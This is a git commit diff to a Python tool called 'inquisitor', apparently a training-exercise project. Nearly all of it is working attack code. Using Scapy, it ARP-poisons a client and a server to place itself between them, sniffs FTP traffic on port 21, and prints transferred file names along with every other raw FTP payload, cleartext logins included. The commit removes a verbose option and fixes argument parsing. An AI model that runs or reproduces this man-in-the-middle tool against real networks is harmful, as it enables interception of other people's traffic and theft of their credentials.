b4402111dfd5c9145252932f243802d7e9c5374d
catal mathis <catalmathis@gmail.com>
2024-06-19 11:59:38 +0200

    marche sans verbose

--- D05-Inquisitor/inquisitor/inquisitor.py
+++ D05-Inquisitor/inquisitor/inquisitor.py
@@ -15,36 +15,43 @@ def arp_spoof(client_ip, client_mac, server_ip, server_mac):
         send(arp_response2, verbose=False)
         time.sleep(1)
 
-def capture_ftp_traffic(pkt, verbose):
+def capture_ftp_traffic(pkt):
     if pkt.haslayer('TCP'):
-        if pkt['TCP'].dport == 21 or pkt['TCP'].sport == 21: 
-            if pkt.haslayer('Raw') and (verbose == True or (pkt['Raw'].load.decode().startswith('RETR') or pkt['Raw'].load.decode().startswith('STOR'))):
-                print(pkt['Raw'].load.decode(errors='ignore'))
+        if pkt['TCP'].dport == 21 or pkt['TCP'].sport == 21:
+            if pkt.haslayer('Raw'):
+                data = pkt['Raw'].load.decode(errors='ignore')
+                if data.startswith('RETR'):
+                    print("File download = " + data.split()[1])
+                elif data.startswith('STOR'):
+                    print("File upload = " + data.split()[1])
+                else:
+                    print(data)
 
 def main():
 
-    arg = argparse.ArgumentParser()
-    arg.add_argument("client_ip", help = "client IP address")
-    arg.add_argument("client_mac", help = "client MAC address")
-    arg.add_argument("server_ip", help = "server IP address")
-    arg.add_argument("server_mac", help = "server MAC address")
-    arg.add_argument("-v", "--verbose", help = "view all packets", action = "store_true")
+    parser = argparse.ArgumentParser()
+    parser.add_argument("client_ip", help="client IP address")
+    parser.add_argument("client_mac", help="client MAC address")
+    parser.add_argument("server_ip", help="server IP address")
+    parser.add_argument("server_mac", help="server MAC address")
+    
+    args = parser.parse_args()
 
     # ARP dans un thread séparé
-    arp_thread = threading.Thread(target=arp_spoof, args=(arg.client_ip, arg.client_mac, arg.server_ip, arg.server_mac))
+    arp_thread = threading.Thread(target=arp_spoof, args=(args.client_ip, args.client_mac, args.server_ip, args.server_mac))
     arp_thread.start()
 
     # Sniffer le trafic FTP
     try:
-        sniff(filter="tcp port 21", prn=capture_ftp_traffic, arg=(arg.verbose), stop_filter=lambda x: stop_event.is_set())
+        sniff(filter="tcp port 21", prn=capture_ftp_traffic, stop_filter=lambda x: stop_event.is_set())
     except KeyboardInterrupt:
         pass
     finally:
         stop_event.set()
         print("\nRestauration des adresses MAC...")
         # Restaurer les adresses MAC
-        arp_response = ARP(pdst=arg.client_ip, hwdst=arg.client_mac, psrc=arg.server_ip, hwsrc=arg.server_mac, op='is-at')
-        arp_response2 = ARP(pdst=arg.server_ip, hwdst=arg.server_mac, psrc=arg.client_ip, hwsrc=arg.client_mac, op='is-at')
+        arp_response = ARP(pdst=args.client_ip, hwdst=args.client_mac, psrc=args.server_ip, hwsrc=args.server_mac, op='is-at')
+        arp_response2 = ARP(pdst=args.server_ip, hwdst=args.server_mac, psrc=args.client_ip, hwsrc=args.client_mac, op='is-at')
         send(arp_response, verbose=False)
         send(arp_response2, verbose=False)
         arp_thread.join()
